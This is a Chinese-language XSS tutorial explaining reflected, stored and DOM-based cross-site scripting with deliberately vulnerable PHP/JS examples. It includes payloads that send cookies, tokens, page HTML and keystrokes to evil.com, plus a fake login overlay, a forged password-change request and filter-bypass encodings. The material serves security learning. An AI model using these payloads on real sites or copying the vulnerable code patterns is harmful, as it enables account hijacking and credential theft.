# XSS 跨站脚本攻击
[TOC]

## 简介
攻击者将恶意脚本注入到网页中，其他用户访问时，浏览器执行恶意脚本，达到窃取信息、引导或冒充用户操作等。

## 前置知识
### JavaScript
补充 XSS 中常见的 JavaScript 对象和方法。

#### document
当前页面的 DOM 对象。
- `cookie`: 当前页面的 Cookie
- `location`: 当前页面的 URL
- `referrer`: 当前页面的来源 URL
- `documentElement`: 当前页面的根节点

#### console
浏览器的调试控制台对象。
- `log()`: 输出日志
- `error()`: 输出错误信息
- `warn()`: 输出警告信息

#### location
当前页面的 URL 对象。
- `href`: 当前页面的完整 URL
- `host`: 当前页面的主机

#### localStorage
浏览器的本地存储对象。
- `setItem(key, value)`: 设置键值对
- `getItem(key)`: 获取键值对
- `removeItem(key)`: 删除键值对

#### sessionStorage
浏览器的会话存储对象。
- `setItem(key, value)`: 设置键值对
- `getItem(key)`: 获取键值对
- `removeItem(key)`: 删除键值对

#### 函数
- `alert()`: 弹出提示框
- `prompt()`: 弹出输入框
- `confirm()`: 弹出确认框
- `fetch()`: 发送网络请求

### DOM
Document Object Model，文档对象模型。浏览器将 HTML 文档解析为 DOM 树，JavaScript 可以通过 DOM 操作页面内容。
#### 节点
| 节点类型 | 说明 | 例子 |
|---------|------|------|
| 元素节点 | HTML 标签 | `<div>`, `<h1>`, `<p>` |
| 文本节点 | 标签之间的文字 | `"欢迎"`, `"这是一个段落"` |
| 属性节点 | 标签的属性 | `id="main"`, `class="desc"` |

#### 主要方法
```js
// 通过 id 查找
document.getElementById('main')
// 通过 class 查找
document.getElementsByClassName('desc')
// 通过标签名查找
document.getElementsByTagName('h1')

// 通过 CSS 选择器查找
document.querySelector('p') // 找第一个
document.querySelectorAll('p') // 所有匹配的元素（一个列表）

// 选择器
'div' // 标签名
'.desc' // class
'#main' // id
'input[name="x"]' // 类型[属性="值"]
```

## 分类
### 反射型 XSS
恶意脚本藏在 URL 参数、Post Body 等位置，服务器将其嵌入页面，反射给用户，被用户浏览器执行。

```php
# 漏洞代码
$keyword = $_GET['q'];
echo "搜索结果: $keyword";
```
```php
# 利用方式
GET /search.php?q=<script>alert('XSS')</script>
```

### 存储型 XSS
恶意脚本被提交到数据库，其他用户访问相关页面时，脚本被取出，嵌入页面并执行。

```php
# 留言板
$content = $_POST['content'];
$db->query("INSERT INTO comments (content) VALUES ('$content')");

# 显示留言
$result = $db->query("SELECT content FROM comments");
while($row = $result->fetch()) {
    echo "<div>" . $row['content'] . "</div>";
}
```
```php
# 利用方式
POST /comment.php

content=<script>alert('XSS')</script>
```
如果恶意脚本能操作用户写入新的 XSS 脚本，可以形成自我传播的蠕虫式攻击。

### DOM 型 XSS
恶意脚本通过修改页面 DOM 结构，直接在客户端执行，不经过服务器。

```html
<script>
    // 从 URL hash 中取值，直接写入页面
    var name = location.hash.substring(1);
    document.getElementById("welcome").innerHTML = "欢迎，" + name;
</script>
```
```js
// 利用方式
GET /page.html/#<img src=x onerror=alert(1)>
```

## 注入方式
### script
内部脚本标签。
```html
<script>alert('XSS')</script>
```

外部链接脚本
```html
<script src="http://evil.com/xss.js"></script>
```

### 事件
**onerror**: 资源加载失败时执行代码
```html
<img src="invalid.jpg" onerror="alert('XSS')">
<source src="invalid.mp4" onerror="alert('XSS')">
<object data="invalid.swf" onerror="alert('XSS')">
``` 

**onload**: 资源加载完成后执行代码
```html
<img src="valid.jpg" onload="alert('XSS')">
<body onload="alert('XSS')">
<svg onload="alert('XSS')">
```

**onfocus**: 元素获得焦点时执行代码
```html
<input onfocus="alert('XSS')">
<textarea onfocus="alert('XSS')">
```

**ontoggle**: 元素状态切换时执行代码
```html
<!--open 设置自动展开并触发-->
<details open ontoggle="alert('XSS')">
```

### 伪协议
**javascript**: 直接执行 JavaScript 代码
```html
<a href="javascript:alert('XSS')">
<iframe src="javascript:alert('XSS')">
<form action="javascript:alert('XSS')">
```

**data**: 将内容解析后嵌入页面
```html
<iframe src="data:text/html,<script>alert('XSS')</script>">
<!--按 base64 解码-->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
```

## 攻击
本质是获得了在他人浏览器中执行 JavaScript 的能力。

### 测试漏洞
验证 XSS 漏洞是否存在，通常使用 `alert()` 弹窗
```js
alert('XSS')
```

### 窃取信息
#### Cookie
窃取 Cookie 以冒充用户登录。
```js
// 直接跳转页面（易暴露）
document.location = 'http://evil.com/?cookie=' + document.cookie;

// 图片请求（隐蔽）
new Image().src = 'http://evil.com/?cookie=' + document.cookie;

// fetch 请求（可以携带更多信息）
fetch('http://evil.com/', {
    method: 'POST',
    body: document.cookie
});
```

#### localStorage/sessionStorage
很多网站不把敏感数据放 cookie 里，而是放在 localStorage 或 sessionStorage 中。
```js
// 窃取 localStorage 中的 token
var token = localStorage.getItem('token');
new Image().src = 'http://evil.com/?token=' + token;

// 窃取整个 sessionStorage
var data = JSON.stringify(sessionStorage); // 转换为字符串
fetch('http://evil.com/', {
    method: 'POST',
    data: encodeURIComponent(data) // 特殊字符做 URL 编码
});
```

#### 其他页面信息
窃取整个页面 html
```js
// documentElement: 整个页面的根节点
    // outerHTML: 元素的内容以及标签自身
var html = document.documentElement.outerHTML;

// 发送到攻击者服务器
fetch('http://evil.com/', {
    method: 'POST',
    body: html
});
```

取走特定元素内容
```js
// querySelector: 选择器选择元素
    // 'input[name="csrf_token"]': 选择 name 属性为 csrf_token 的 input 元素
        // value: 获取 input 元素的值
var csrfToken = document.querySelector('input[name="csrf_token"]').value;

// 发送到攻击者服务器
new Image().src = 'http://evil.com/?csrf_token=' + csrfToken;
```

### 钓鱼弹窗
弹出一个假的登录框（在正规网站背景下），骗用户输入账号密码之类。
```js
// 来，骗，来，偷袭
var password = prompt('请输入密码:');
new Image().src = 'http://evil.com/?password=' + password;
```

### 篡改页面内容
把整个页面替换成攻击者设计的假页面，骗用户数据信息或者下载木马。
```js
// body: 页面主体
    // innerHTML: 元素的内部内容，不含标签自身
document.body.innerHTML = `
  <div style="text-align:center;margin-top:100px;">
    <h2>登录</h2>
    <form action="http://evil.com" method="POST">
      <input name="username" placeholder="用户名"><br><br>
      <input name="password" type="password" placeholder="密码"><br><br>
      <button type="submit">登录</button>
    </form>
  </div>
`; // `` 模板字符串，可以换行或插入变量 ${var}
```

或者直接跳转到攻击者的恶意网站
```js
// 3 秒后跳转，稍显自然
setTimeout(function() {
    document.location = 'http://evil.com/fake_login.html';
}, 3000);
```

### 窃听键盘输入
```js
// onkeydown: 键盘按下时触发事件
document.onkeydown = function(e) {
    // e.key: 按键的值
    new Image().src = 'http://evil.com/?key=' + e.key;
};
```

### 伪造请求（CSRF）
以受害者身份向网站发送请求，让网站以为是本人操作，移花接木。
```js
// 改密码
fetch('/api/change_password', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ // 请求体（JSON 格式）
        old_password: '旧密码',
        new_password: '攻击者设的新密码'
    })
});
```

## 过滤绕过
### 空格过滤
如果空格被过滤，用其他字符代替。
|字符|含义|
|---|---|
|`%09`|水平制表符|
|`%0a`|换行符|
|`%0d`|回车符|
|`/`|斜杠|

### 关键字过滤
html 不区分大小写，可混用
```html
<ScRiPt>alert('XSS')</sCrIpT>
```

双写关键字（只过滤一次的情况）
```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```

编码绕过
```html
<!-- HTML 实体编码 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- URL 编码（在 href 等 URL 属性中） -->
<a href="javascript:%61%6c%65%72%74(1)">

<!-- Unicode 编码 -->
<img src=x onerror="\u0061lert(1)">

<!-- base64 + eval -->
<script>
eval(atob('YWxlcnQoMSk=')) // atob() 解码 base64
</script>
```
